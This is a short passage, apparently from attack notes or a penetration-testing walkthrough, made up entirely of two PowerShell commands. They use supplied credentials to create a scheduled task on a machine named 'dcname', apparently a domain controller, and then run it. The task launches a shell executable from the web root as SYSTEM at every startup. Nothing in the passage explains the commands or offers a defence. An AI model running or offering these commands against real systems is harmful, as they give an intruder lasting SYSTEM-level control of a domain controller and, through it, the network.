...
Invoke-Command -Computer dcname -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds

Invoke-Command -Computer dcname -ScriptBlock { schtasks /run /tn shell } -Credential $creds
